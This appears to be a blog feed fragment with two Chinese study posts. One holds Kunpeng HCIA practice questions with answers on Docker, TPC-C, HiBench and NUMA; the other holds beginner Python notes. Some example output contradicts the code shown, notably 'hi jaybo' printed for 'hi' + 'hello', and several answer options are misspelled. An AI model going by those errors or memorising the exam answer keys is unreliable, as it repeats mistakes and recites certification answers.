？(ABD)<br>A. Dockerfile一般包含四部分内容：基础镜像信息、维护者信息、镜像操作指令容器        启动时执行指令<br>B. Dockerfile中，第一条指令必须为FROM指令<br>C. EXPOSE在Dockerfile中是必选的<br>D. 完成Dockerfile编写后，可以通过docker build命令来创建镜像</p></li><li><p>关于执行命令“docker ps -a”后，显示的标题含义描述，正确的是？（ABCD）<br>A. CONTAINER ID:容器的唯一表示ID<br>B. IMAGE:创建容器时使用的镜像<br>C. COMMAND:容器最后运行的命令<br>D. CREATED:创建容器的时间</p></li><li><p>关于Docker的镜像仓库，说法正确的是？( ABCD)<br>A.实现Docker镜像的全局存储<br>B. 提供API接口<br>C.提供Docker镜像的下载/推送/查询<br>D.可用于租户管理</p></li><li><p>-mabi=lp64 是编译生成应用程序为64位的鲲鹏编译选项( A)<br>A. True<br>B. False</p></li><li><p>在向鲲鹏处理器迁移软件时，以下哪些是可能导致编译错误或告警的原因？（ABC ）<br>A. 编译选项<br>B. 数据类型不同<br>C. 汇编指令<br>D. 弱内存序问题</p></li><li><p>弱内存序问题主要与如下那些因素相关？（ACE ）<br>A. 多线程<br>B. 多进程<br>C. 不同CPU之间Cache同步<br>D. 一级、二级、三级Cache间数据同步<br>E. 不同core之间Cache同步</p></li><li><p>以下哪个工具可以用于鲲鹏平台上进行代码迁移？(C)<br>A. Tuning kit( 华为鲲鹏性能优化工具)<br>B. Dependency Advisor(华为鲲鹏分析扫描工具)<br>C. Porting Advisor<br>D. GCC</p></li></ol><h3 id="第三章-应用性能测试与调优"><a href="#第三章-应用性能测试与调优" class="headerlink" title="第三章 应用性能测试与调优"></a>第三章 应用性能测试与调优</h3><p>这章的知识点占比为<strong>20%</strong> ，包括理论与实验。主要介绍了在数据库、大数据和HPC场景下进行性能测试的方法，使用华为鲲鹏性能优化工具Kunpeng <strong>Tuning Kit</strong>对<code>C/C++</code>类程序和<code>Java Mixed-Mode</code>类程序进行性能分析的方法，以及对<code>NUMA</code>和线程并发数进行性能调优的案例。</p><p><strong>TPCC - 测试模型</strong></p><ul><li>TPC-C是针对OLTP的基准测试模型，可以衡量数据库的性能和硬件性价比，是广泛应用并关注的一种测试模型。</li><li>TPCC测试模型是一个大型的商品批发销售公司，它拥有若干个分布在不同区域的商品仓库。</li></ul><ol><li><p>TCPP模型可以支持跨平台供货？(A)<br> A、True<br> B、False</p></li><li><p>以下哪个不是TPCC 的交易类型？<br> A、统计订单总额<br> B、新订单<br> C、支付操作<br> D、发货</p></li></ol><p><strong>TPCC - 交易类型</strong></p><ul><li>新订单（New-Order）：客户输入一笔新的订货交易。</li><li>支付操作（Payment）：更新客户帐户余额以反映其支付状况。</li><li>发货（Delivery）：发货（模拟批处理交易）。</li><li>订单状态查询（Order-Status）：查询客户最近交易的状态。</li><li>库存状态查询（Stock-Level）：查询仓库库存状况，以便能够及时补货。</li></ul><p><strong>TPCC - 性能衡量指标</strong></p><ul><li>流量指标 <code>tpmC</code><br>系统在执行支付操作、订单状态查询、发货和库存状态查询这四种交易时，每分钟可以处理多少个新订单交易。</li><li>性价比 <code>Price/tpmC</code><br>测试系统的整体价格与流量指标的比值，在获得相同的流量指标即tpmC（transactions per minute，C即基准程序）值的情况下，价格越低越好。</li></ul><p><strong>测试工具 — BenchmarkSQL</strong></p><ul><li><p>Java语言编写，内嵌TPCC测试脚本的TPCC基础测试程序，是对<strong>数据库</strong>进行性能测试的工具。</p></li><li><p>通过JDBC连接数据库，执行TPCC模型测试。</p></li><li><p>支持数据库：<br>Oracle<br>PostgreSQL<br>EnterpriseDB<br>DB2<br>SQL Server<br>GaussDB</p></li></ul><p><strong>测试流程</strong>：<br><img src="http://img-blog.csdnimg.cn/20200405143600414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>BenchmarkSQL —场景配置</strong></p><ul><li>warehouse：指定仓库数量。</li><li>loadWorkers：指定装载数据的并发数。</li><li>Terminals：指定并发用户数。</li><li>runMins：指定测试时间。</li><li>runTxnsPerTerminal：指定每个Terminal运行的事务数量，runMins必须等于0。</li><li>limitTxnsPerMin：指定每分钟总事务数。</li><li>terminalWarehouseFixed：指定每个终端是否绑定固定warehouse。</li></ul><p>1个warehouse的数据大小是75M。<br> loadWorkers只是加载数据时的并发用户数。</p><p><strong>思考题：</strong></p><ol><li>BenchmarkSQL场景配置，以下说法哪个是正确的?（C）<br> A、runMins，runTxnsPerTerminal必须不相等<br> B、runMins，runTxnsPerTerminal都等于0<br> C、指定每个Terminal运行的事务数量，runMins必须等于0<br> D、runMins，runTxnsPerTerminal都不等于0</li></ol><p><strong>BenchmarkSQL-执行测试</strong></p><ul><li>衡量标准:<br>tpmC（NewOrders）:每分钟内系统处理的新订单个数<br>tpmTOTAL（TPS）每分钟内系统处理的事务总数</li></ul><p> <strong>思考题：</strong></p><ol><li><p>TPCC衡量标准是什么？( C ）<br>A. QphH<br>B. 响应时间<br>C. tpmC<br>D.TPS</p></li><li><p>BenchmarkSQL配置文件中loadWorkers指的是什么（   B ）。<br>A. 并发用户数<br>B. 数据库装载并发数<br>C. 数据库并行数<br>D. 数据库表的数量</p></li><li><p>BenchmarkSQL 测试中，tpmC和tpmTOTAL这两个值越大，代表性能越差？(B)<br> A、True<br> B、False</p></li></ol><p><strong>大数据基准测试套件—HiBench</strong></p><p>HiBench简介：</p><ul><li>开源的大数据基准测试套件。</li><li>用于评估大数据框架的速度，吞吐量和系统资源利用率。</li><li>支持的框架：hadoopbench、sparkbench、stormbench、flinkbench、gearpumpbench。</li><li>支持的开源版本组件：Hadoop、Spark、Storm、Kafka、Flink。</li><li>目前使用较多的版本：HiBench-7.0。</li><li>共计19个测试方向，可分为6种测试类别。</li></ul><p><strong>趁热打铁：</strong></p><ol><li>iBench支持的框架有哪些？（ABCD ）<br> A. flinkbench<br> B. hadoopbench<br> C. stormbench<br> D. sparkbench</li></ol><p><strong>HiBench - 测试分类</strong></p><ul><li>共6种测试类别：<br><img src="http://img-blog.csdnimg.cn/20200405150619434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><ol><li>micro：微基准测试</li><li>ml：机器学习</li><li>sql：SQL查询</li><li>graph：图计算</li><li>websearch：Web搜索</li><li>streaming：流数据计算</li></ol><p><strong>趁热打铁：</strong></p><ol><li><p>HiBench测试分类有以下几种？(ABCD)<br> A.micro<br> B.ml<br> C.Hadoop<br> D.graph<br> E.streaming</p></li><li><p>CPU性能和网络带宽都会影响HPC性能？(A)<br> A. Ture<br> B. False</p></li></ol><p><strong>高性能计算简介</strong>:</p><ul><li>什么是HPC?<br>HPC（High Performance Computing）高性能计算，是通过高速网络将大量服务器进行互联形成计算机集群，与高性能存储一起，求解科研、工业界最复杂的科学计算问题（科学研究领域三大范式：理论科学，实验科学，计算科学）。</li></ul><p><strong>HPC典型应用 - WRF</strong></p><ul><li>WRF（Weather Research and Forecasting Model）是次世代的中尺度天气预报模式，包括多重区域、从几公里到数千公里的灵活分辨率、多重嵌套网格，以及与之协调的三维变分同化系统3DVAR等。</li></ul><p><strong>性能测试 - WRF测试流程</strong> </p><ul><li>以气象行业应用WRF为例，进行单次安装测试的流程图：<br><img src="http://img-blog.csdnimg.cn/20200405152939720.png" alt="在这里插入图片描述"></li></ul><p><strong>思考题：</strong></p><ol><li>下列哪些选项可能会影响WRF性能？（ABCD）<br>A. 网络带宽<br>B. 并行线程数<br>C. 内存刷新频率<br>D. 存储读写速度</li></ol><p><strong>华为鲲鹏性能优化工具</strong></p><ul><li>为解决客户软件运行遇到性能问题时凭人工经验定位困难、调优能力弱的痛点，华为推出了Kunpeng <strong>Tuning Kit</strong>鲲鹏性能优化工具。</li></ul><p><strong>思考题：</strong></p><ol><li>使用华为鲲鹏性能优化工具对C/C++应用程序进行性能分析时，能够查看到函数源代码、汇编代码，以及函数汇编代码basic block的控制流图？（A）<br> A. True<br> B. Flase</li></ol><ul><li><p>华为鲲鹏性能优化工具部署，当前版本<strong>只支持单机</strong>部署，即将华为鲲鹏性能优化工具所有组件部署在一台服务器上，完成对该台服务器软件的性能数据采集和分析。</p></li><li><p>部署环境要求如下表所示：<br><img src="http://img-blog.csdnimg.cn/20200405154156311.png" alt="在这里插入图片描述"></p></li></ul><p><strong>趁热打铁：多选题</strong></p><ol><li>鲲鹏性能分析工具支持以下哪几种操作系统？（AB）<br> A.OpenEuler<br> B.Centos<br> C.RedHat<br> D.Neokylin</li></ol><p><strong>华为鲲鹏性能优化工具访问方式</strong></p><ul><li>华为鲲鹏性能优化工具部署在TaiShan服务器上，该服务器上同时运行客户的应用软件。</li><li>华为鲲鹏性能优化工具提供Web界面访问方式，用户只需要在浏览器地址栏中输入：https://部署服务器的IP:端口号即可。</li></ul><p>华为鲲鹏性能优化工具支持以<strong>多用户多任务并发</strong>访问的方式使用Web界面。<br>https默认端口号为<strong>8086</strong>，请确认使用该工具之前OS防火墙已开通8086端口。</p><p><strong>函数火焰图</strong></p><ul><li>火焰图就是看顶层的哪个函数占据的宽度最大。只要有“平顶”（plateaus），就表示该函数可能存在性能问题。</li><li>颜色没有特殊含义，因为火焰图表示的是CPU的繁忙程度，所以一般选择暖色调。</li></ul><p><strong>思考题：</strong></p><ol><li><p>华为鲲鹏性能优化工具支持从哪些维度分析应用的性能瓶颈？（AB）<br>A. C/C++<br>B. Java Mixed-Mode<br>C. Locks and Waits<br>D. LLC&amp;DDR</p></li><li><p>华为鲲鹏性能优化工具能够提供（ABCD）方面的性能分析结果。<br>A.分析Top热点函数<br>B.分析函数火焰图<br>C.分析热点函数代码映射<br>D.分析不同函数对应top-down模型的各指标值</p></li></ol><p><strong>NUMA</strong></p><p>物理上，一个DDR只挂载在一个node上，其它node要访问这个node上的DDR需要通过片内总线（如图中的1）或片间总线（如图中的2）进行通信，内存访问延迟从高到低为：</p><blockquote><p>  跨Socket &gt; 跨NUMA不跨Socket &gt; NUMA内</p></blockquote><p><img src="http://img-blog.csdnimg.cn/2020040516140447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>NUMA：Non-uniform Memory Access，非一致性内存访问。</li><li>DDR：Double Data Rate SDRAM，双倍速率SDRAM，就是我们常说的内存条。</li><li>Socket：插槽，实体CPU插在主板的一个插槽上，这里代表可以在主板上独立插拔的CPU。一个主板上可以包含多个Socket。</li><li>NUMA node：NUMA节点，属于同一个node的Core共享部分资源，如内存控制器。一个Socket可以包含一个或多个NUMA node。</li><li>Core：中央处理单元，一个独立的硬件执行单元，有独立的算术逻辑单元和寄存器等。一个NUMA node可以包含多个Core。</li></ul><p><strong>趁热打铁：</strong></p><p>内存访问延时从高到低是（A）单选题<br>    A、跨Socket&gt;跨NUMA不跨Socket&gt;NUMA内<br>    B、跨NUMA不跨Socket&gt;跨Socket&gt;NUMA内<br>    C、NUMA内&gt;跨NUMA不跨Socket&gt;跨Socket<br>    D、跨Socket&gt;NUMA内&gt;跨NUMA不跨Socket</p><p><strong>思考题：</strong></p><ol><li>NUMA架构下，什么原因导致了CPU core访问不同的DDR的性能不一样？<br>答：物理上，一个DDR只挂载在一个node上，其它node要访问这个node上的DDR需要通过片内总线或片间总线进行通信。</li></ol><p>🆗以上就是本周的重点内容了。</p>]]></content>
      
      
      <categories>
          
          <category> 鲲鹏HCIA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HCIA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习笔记（一）</title>
      <link href="2019/12/05/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>2019/12/05/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>前言：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;立个flag，从今天开始学习Python （￣︶￣）↗，希望自己能坚持下去。</p><blockquote><p>那些最好的程序员不是为了得到更高的薪水或者得到公众的仰慕而编程，他们只是觉得这是一件有趣的事情。（扯淡） ——Linux 之父 LinusTorvalds</p></blockquote><ul><li><p> Python 的设计理念是 “优雅”、“明确”、“简单”。</p></li><li><p>人生苦短，我用Python</p><hr></li></ul><p>关于python的介绍就不多说了，只记录下一些重要的部分，在系统的学习之前先说下python语言的一些特点。</p><h4 id="一、Python3-基础语法："><a href="#一、Python3-基础语法：" class="headerlink" title="一、Python3 基础语法："></a>一、Python3 基础语法：</h4><p><strong>1、编码</strong>:</p><p>默认情况下，Python 3源码文件以<code>utf-8</code>编码，所有字符串都是 unicode 字符串。 当然也可以为源码文件指定不同的编码：</p><pre><code class="python"># -*- coding:UTF-8  -*-</code></pre><pre><code class="python"># -*- coding:cp-1252 -*-</code></pre><p> <strong>2、python保留字</strong>:</p><p>保留字即关键字，我们不能把它们用作任何标识符名称。Python 的标准库提供了一个 keyword 模块，可以输出当前版本的所有关键字：</p><pre><code class="python">&gt;&gt;&gt; import keyword&gt;&gt;&gt; keyword.kwlist[&#39;False&#39;, &#39;None&#39;, &#39;True&#39;, &#39;and&#39;, &#39;as&#39;, &#39;assert&#39;, &#39;break&#39;, &#39;class&#39;, &#39;continue&#39;, &#39;def&#39;, &#39;del&#39;, &#39;elif&#39;, &#39;else&#39;, &#39;except&#39;, &#39;finally&#39;, &#39;for&#39;, &#39;from&#39;, &#39;global&#39;, &#39;if&#39;, &#39;import&#39;, &#39;in&#39;, &#39;is&#39;, &#39;lambda&#39;, &#39;nonlocal&#39;, &#39;not&#39;, &#39;or&#39;, &#39;pass&#39;, &#39;raise&#39;, &#39;return&#39;, &#39;try&#39;, &#39;while&#39;, &#39;with&#39;, &#39;yield&#39;]</code></pre><p> <strong>3、标识符</strong>:</p><ul><li>第一个字符必须是<strong>字母</strong>或<strong>下划线</strong> <code>_</code> 。</li><li>标识符对大小写敏感。</li><li>在 Python 3 中，可以用中文作为变量名。</li></ul><p> <strong>4、注释</strong>:</p><p>Python中单行注释以 <code>#</code> 开头，Python中单行注释以#开头，多行注释用三个单引号（<code>&#39;&#39;&#39;</code>）或者三个双引号（<code>&quot;&quot;&quot;</code>）将注释括起来。</p><p>例：</p><pre><code class="csharp">#!/usr/bin/python3# 第一个注释print (&quot;Hello, Python!&quot;) # 第二个注释</code></pre><p> <strong>5、行与缩进</strong>：</p><ul><li><p>python最具特色的就是使用缩进来表示代码块，不需要使用大括号 <code>&#123;&#125;</code> 。</p></li><li><p>缩进的空格数是可变的，但是<strong>同一个代码块的语句必须包含相同的缩进空格数</strong>。实例如下：</p></li></ul><pre><code class="csharp">if True:    print (&quot;True&quot;)else:    print (&quot;False&quot;)</code></pre><p>以下代码最后一行语句缩进数的空格数不一致，会导致运行错误：</p><pre><code class="python">if True:    print (&quot;Answer&quot;)    print (&quot;True&quot;)else:    print (&quot;Answer&quot;)  print (&quot;False&quot;)    # 缩进不一致，会导致运行错误</code></pre><p> <strong>6、多行语句</strong>：</p><p> Python 通常是一行写完一条语句，但如果语句很长，我们可以使用反斜杠<code>\</code>来实现多行语句，例如：</p><pre><code class="csharp">total = item_one + \        item_two + \        item_three</code></pre><p>在 [], {}, 或 () 中的多行语句，不需要使用反斜杠()，例如：</p><pre><code class="csharp">total = [&#39;item_one&#39;, &#39;item_two&#39;, &#39;item_three&#39;,        &#39;item_four&#39;, &#39;item_five&#39;]</code></pre><p> <strong>7、同一行使用多条语句</strong>：</p><p> Python可以在同一行中使用多条语句，语句之间使用分号<code>;</code>分割，以下是一个简单的实例：</p><pre><code class="csharp">import sys; x = &#39;runoob&#39;; sys.stdout.write(x + &#39;\n&#39;)</code></pre><p>输出结果为：</p><pre><code class="csharp">runoob</code></pre><p> <strong>8、导入模块</strong>：</p><ul><li>在 python 用 <code>import</code> 或者 <code>from...import</code> 来导入相应的模块。</li><li>将整个模块(somemodule)导入： <code>import somemodule</code></li><li>从某个模块中导入某个函数： <code>from somemodule import somefunction</code></li><li>从某个模块中导入多个函数： <code>from somemodule import firstfunc, secondfunc, thirdfunc</code></li><li>将某个模块中的全部函数导入： <code>from somemodule import *</code></li></ul><p> <strong>9、输入输出</strong>：</p><p>执行下面的程序在按回车键后就会等待用户输入：</p><pre><code class="python">input(&quot;请输入：&quot;)</code></pre><p><img src="https://img-blog.csdnimg.cn/20200930203006395.png" alt="在这里插入图片描述"></p><p>用户按下 enter 键时，程序将退出。</p><p> <code>print</code> 默认输出是换行的，如果要实现不换行需要在变量末尾加上 <code>end=&quot;&quot;: </code> ，引号里可以添加符号用来分隔数据。</p><p> 例：</p><p><img src="https://img-blog.csdnimg.cn/20200930211450520.png" alt="在这里插入图片描述"></p><hr><p> <strong>第一个 Python3 程序</strong>:</p><pre><code class="python">#!/usr/bin/python3print(&quot;Hello, World!&quot;)</code></pre><p><code>​#!/usr/bin/python​​</code> ：指定用什么解释器运行脚本（如果是python2就用<code>#!/usr/bin/python2</code>，python3同理）和解释器所在的位置，如果解释器没有装在/usr/bin/目录，改成其所在目录就行了，或者更通用的方法是（自动寻找解释器）：</p><pre><code class="java">#!/usr/bin/env python​</code></pre><p>将以上代码保存在 ​hello.py​ 文件中并使用 python 命令执行该脚本文件。</p><pre><code class="python">python hello.py</code></pre><p>以上命令输出结果为：<br><img src="https://img-blog.csdnimg.cn/20200922200245998.png" alt="在这里插入图片描述"></p><p>🆗，这些基本的东西说完了，开始正式学习。<hr></p><h3 id="第一节：变量和字符串"><a href="#第一节：变量和字符串" class="headerlink" title="第一节：变量和字符串"></a>第一节：变量和字符串</h3><p>首先：Python 每个语句结束可以不写分号 <code>;</code>， 如 <code>print(&#39;hello&#39;)</code> 打印 <code>hello</code></p><h5 id="1、变量"><a href="#1、变量" class="headerlink" title="1、变量"></a>1、变量</h5><p>因为之前学过编程语言，变量就不多说了。需要注意的是，Python 对<strong>大小写敏感</strong>，也就是说 “a” 和 “A” 会是两个不同的变量。</p><h5 id="2、字符串"><a href="#2、字符串" class="headerlink" title="2、字符串"></a>2、字符串</h5><p> <strong>1、基本介绍</strong>：</p><p>单引号 <code>&#39;&#39;</code>或者双引号 <code>&quot;&quot;</code> 都可以，再或者 <code>&#39;&#39;&#39; &#39;&#39;&#39;</code> 三引号，其中三引号被用于过于长段的文字或者是说明，只要是三引号不完你就可以随意换行写下文字。</p><ul><li>字符串直接能相加，如：<pre><code class="csharp">str1 = &#39;hi&#39;str2 = &#39;hello&#39;print(str1 + str2)</code></pre>运行结果：</li></ul><pre><code class="csharp">hi jaybo</code></pre><ul><li>字符串相乘，如：<pre><code class="csharp">string = &#39;bang!&#39;total = string * 3 </code></pre></li></ul><p>打印 total ：</p><pre><code class="csharp">bang!bang!bang!</code></pre><p><strong>2、字符串的分片与索引</strong>：</p><p>字符串可以通过 <code>string[n]</code> 的方式进行索引和分片。</p><p>字符串的分片实际可以看作是从字符串中找出来你要截取的东西，复制出来一小段你要的长度，存储在另一个地方，而不会对字符串这个源文件改动。分片获得的每个字符串可以看作是原字符串的一个副本。</p><p>先看下面这段代码：</p><pre><code class="csharp">name = &#39;My name is Mike&#39;print(name[0])&#39;M&#39;print(name[-4])&#39;M&#39;print(name[11:14]) # from 11th to 14th, 14th one is excluded&#39;Mik&#39;print(name[11:15]) # from 11th to 15th, 15th one is excluded&#39;Mike&#39;print(name[5:])&#39;me is Mike&#39;print(name[:5])&#39;My na&#39;</code></pre><p>解释：<br><img src="https://img-blog.csdnimg.cn/20191121192741750.png" alt="在这里插入图片描述"><br><code>:</code> 两边分别代表着字符串的分割从哪里开始，并到哪里结束。</p><p>以 name[11:14] 为例，截取的编号从第11个字符开始，到位置为14但不包含第14个字符结束。</p><p>而像 name[5:] 这样的写法代表着从编号为5的字符到结束的字符串分片。</p><p>相反，name[:5] 则代表着从编号为0的字符开始到编号为5但不包含第5个字符的字符分片。可能容易搞混，可以想象成第一种是从5到最后面，程序员懒得数有多少个所以就省略地写。第二种是从最前面到5，同样是懒得写0，所以就写成了 [:5] 。</p><p><strong>3、尝试</strong>：</p><pre><code class="csharp">num = 1string = &#39;1&#39;print(num + string)</code></pre><p>上面代码将出错！</p><p>解释：整数型不能和字符串直接相加。可以先把该字符串转为整数型，再相加，即 <code>int(string)</code></p><pre><code class="csharp">num = 1string = &#39;1&#39;print(num + int(string))</code></pre><p><strong>4、 字符串的方法</strong>：</p><p>这里以<strong>replace</strong>方法为例</p><ul><li>很多时候你使用手机号在网站注册账户信息，为了保证用户的信息安全性，通常账户信息只会显示后四位，其余的用 * 来代替，我们试着用字符串的方法来完成这一个功能。</li></ul><p>输入代码：</p><pre><code class="csharp">phone_number = &#39;1386-666-0006&#39;hiding_number = phone_number.replace(phone_number[:9],&#39;*&#39; * 9)print(hiding_number)</code></pre><p>我们使用了一个字符串方法 <code>replace()</code>进行“遮挡”。replace 方法的括号中，第一个 <code>phone_number[:9]</code> 代表要被替换掉的部分，后面的 <code>&#39;*&#39; * 9</code> 表示将要替换成什么字符，也就是把 <code>*</code> 乘以9，显示9个 <code>*</code> 。</p><p>你会得到这样的结果：<code>*********0006</code></p><h3 id="第二节：函数"><a href="#第二节：函数" class="headerlink" title="第二节：函数"></a>第二节：函数</h3><h4 id="1、创建函数"><a href="#1、创建函数" class="headerlink" title="1、创建函数"></a>1、创建函数</h4><p>Python 中所谓的使用函数，就是把你要处理的对象放到一个名字后面的括号里。简单来说，函数就是这么使用的，往里面塞东西就可以得到处理结果。这样的函数在 Python 中还有很多。<br>这里面先介绍几个常见的词：</p><ul><li><code>def</code>（即 define，定义）的含义是创建函数，也就是定义一个函数。</li><li><code>arg</code> （即 argument，参数）有时你还能见到这种写法：<code>parameter</code>，二者都是参数的意思但是稍有不同，这里不展开说了。</li><li><code>return</code> 即返回结果<br><img src="https://img-blog.csdnimg.cn/2019112119523915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,sha1dow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li><strong>举个例子</strong>：<br>把摄氏度转化定义为函数 fahrenheit_Converter() ，那么将输入进去的必然是摄氏度（Celsius）的数值，我们把 C 设为参数，最后返回的是华氏度（fahrenheit）的数值，我们用下面的函数来表达，输入代码：</li></ul><pre><code class="csharp">def fahrenheit_converter(C):     fahrenheit = C * 9/5 + 32     return str(fahrenheit) + &#39;˚F&#39;</code></pre><p> 注：计算的结果类型是float，不能与字符串<code>&#39;˚F&#39;</code>相合并，所以需要先用str()函数进行转换。</p><p>输入完以上代码后，函数定义完成，那么我们开始使用它。我们把使用函数这种行为叫做“调用”（call）。</p><p>下面这段代码意味着——“请使用摄氏度转换器将35摄氏度转换成华氏度，将结果储存在名为 C2F 的变量并打印出来。”这样我们就完成了函数的调用同时打印了结果。</p><pre><code class="csharp">C2F = fahrenheit_converter(35)print(C2F)</code></pre><h4 id="2、传递参数与参数类型"><a href="#2、传递参数与参数类型" class="headerlink" title="2、传递参数与参数类型"></a>2、传递参数与参数类型</h4><p>前面说了关于函数定义和使用，在这一节我们谈论一些细节但是重要的问题一一参数。对于在一开始就设定了必要参数的函数来说，我们是通过打出函数的名称并向括号中传递参数实现对函数的调用（call），即只要把参数放进函数的括号中即可，就像是这样：</p><pre><code class="csharp">fahrenheit_converter(35)fahrenheit_converter(15)</code></pre><p>事实上，传递参数的方式有两种：</p><ul><li>位置参数</li><li>关键词参数</li></ul><p>例:</p><pre><code class="csharp">def trapezoid_area(base_up, base_down, height):     return 1/2 * (base_up + base_down) * height</code></pre><p>接下来我们开始调用函数。</p><pre><code class="csharp">trapezoid_area(1,2,3)</code></pre><p>不难看出，填入的参数 1，2，3 分别对应着参数 <code>base_up</code>，<code>base_down</code> 和 <code>height</code>。 这种传入参数的方式被称作为<strong>位置参数</strong>。</p><p>接着是第二种传入方式：</p><pre><code class="csharp">trapezoid_area(base_up=1, base_down=2, height=3)</code></pre><p>更直观地，在调用函数的时候，我们将每个参数名称后面赋予一个我们想要传入的值。这种以名称作为一一对应的参数传入方式被称作是<strong>关键词参数</strong>。</p><p>避免混乱的最好方法就是先制造混乱，我们试着解决一个更复杂的问题，按照下面几种方式调用函数并打印结果：</p><pre><code class="csharp">trapezoid_area(height=3, base_down=2, base_up=1)   # RIGHT!trapezoid_area(height=3, base_down=2, 1)           # WRONG!trapezoid_area(base_up=1, base_down=2, 3)          # RIGHT!trapezoid_area(1, 2, height=3)                     # RIGHT!</code></pre><ul><li>第一行的函数参数按照反序传入，因为是关键词参数，所以并不影响函数正常运作；</li><li>第二行的函数参数反序传入，但是到了第三个却变成了位置参数，遗憾的是这种方式是 错误的语法，因为如果按照位置来传入，最后一个应该是参数 height 的位置。 但是前面 height 已经按照名称传入了值3，所以是冲突的。</li><li>第三行的函数参数正序传入，前两个是以关键词的方式传入，最后一个以位置参数传入，这个函数是可以正常运行的；</li><li>第四行的函数参数正序传入，前两个是以位置的方式传入，最后一个以关键词参数传入，这个函数是可以正常运行的。</li></ul><h5 id="2-1-认识一个新的函数一-“open”"><a href="#2-1-认识一个新的函数一-“open”" class="headerlink" title="2.1 认识一个新的函数一 “open”"></a>2.1 认识一个新的函数一 “open”</h5><p>这个函数使用起来很简单，只需要传入两个参数就可以正常运转了：文件的完整路径和名称，打开的方式。</p><p>如果是 Windows 用户，应该像这样写你的路径：</p><pre><code class="csharp">file = open(&#39;C:/Users/smk/Desktop/text.txt&#39;,&#39;w&#39;) file.write(&#39;hello world!&#39;)file.close()</code></pre><p><img src="https://img-blog.csdnimg.cn/20191125115206221.png" alt="在这里插入图片描述"><br>这段代码打开了桌面上的 file.txt 文件，并写入了 “Hello World” ，<code>w</code> 代表着如果桌面上有 file.txt 这个文件就直接写入 “hello world” ,如果没有 file.txt 这个文件就创建一个这样的文件。<br>但此时数据只写到了缓存中，并未保存到文件！文件需要<code>close()</code>方法关闭这个文件即可将缓存中的数据写入到文件中。</p><h3 id="第三节：循环与判断"><a href="#第三节：循环与判断" class="headerlink" title="第三节：循环与判断"></a>第三节：循环与判断</h3><h4 id="1、逻辑判断一一True-amp-False"><a href="#1、逻辑判断一一True-amp-False" class="headerlink" title="1、逻辑判断一一True &amp; False"></a>1、逻辑判断一一True &amp; False</h4><p>之前学过编程语言，这里就不多写了。</p><h4 id="2、成员运算符与身份运算符"><a href="#2、成员运算符与身份运算符" class="headerlink" title="2、成员运算符与身份运算符"></a>2、成员运算符与身份运算符</h4><p>成员运算符和身份运算符的关键词是 <code>in</code> 与 <code>is</code>。把 <code>in</code> 放在两个对象中间的含义是，测试前者是否存在于 <code>in</code> 后面的集合中。<br>例：</p><pre><code class="csharp">album = [&#39;Black Star&#39;,&#39;David Bowie&#39;,25,True]</code></pre><p>接下来我们使用 in 来测试字符串 “Black Star” 是否在列表 album 中。如果存在则会显示 True，不存在就会显示 False 了：</p><pre><code class="csharp">&#39;Black Star&#39; in album</code></pre><p>接下来再来说 <code>is</code> 和 <code>is not</code>，它们是表示身份鉴别的布尔运算符，<code>in</code> 和 <code>not in</code> 则是表示归属关系的布尔运算符号。</p><p>在 Python 中任何一个对象都要满足身份（Identity）、类型（Type）、值 （Value）这三个点，缺一不可。<code>is</code> 操作符号就是来进行身份的对比的。<br>例：</p><pre><code class="csharp">the_Eddie = &#39;Eddie&#39;name = &#39;Eddie&#39;  the_Eddie is name</code></pre><p>当两个变量一致时，经过 is 对比后会返回 True。</p><h4 id="3、条件控制"><a href="#3、条件控制" class="headerlink" title="3、条件控制"></a>3、条件控制</h4><p>条件控制其实就是 <code>if…else</code> 的使用。先来看下条件控制的基本结构：<br><img src="https://img-blog.csdnimg.cn/2019112512173868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>例：</p><pre><code class="csharp">def account_login():     password = input(&#39;Password:&#39;)     if password == &#39;12345&#39;:         print(&#39;Login success!&#39;)      else:           print(&#39;Wrong password or invalid input!&#39;)                                                     account_login() account_login()</code></pre><ul><li>第1行：定义函数，并不需要参数；</li><li>第2行：使用 input 获得用户输入的字符串并储存在变量 password 中；</li><li>第3、4行：设置条件，如果用户输入的字符串和预设的密码12345相等时，就执行打印- 文本‘Login success！’；</li><li>第5、6行：反之，一切不等于预设密码的输入结果，全部会执行打印错误提示，并且再次调用函数，让用户再次输入密码；</li><li>第7行：运行函数；</li><li>第8行：调用函数。<br>如果 if 后面的布尔表达式过长或者难于理解，可以采取给变量赋值的办法来储存布尔表达式返回的布尔值 True 或 False。因此上面的代码可以写成这样：</li></ul><pre><code class="csharp">def account_login():    password = input(&#39;Password:&#39;)    password_correct = password == &#39;12345&#39;     #HERE！    if password_correct:        print(&#39;Login success!&#39;)    else:        print(&#39;Wrong password or invalid input!&#39;)        account_login()account_login()</code></pre><p>多条件判断同样很简单，只需在 if 和else 之间增加上 elif，用法和 if 是一致的。就不多说了。<br><img 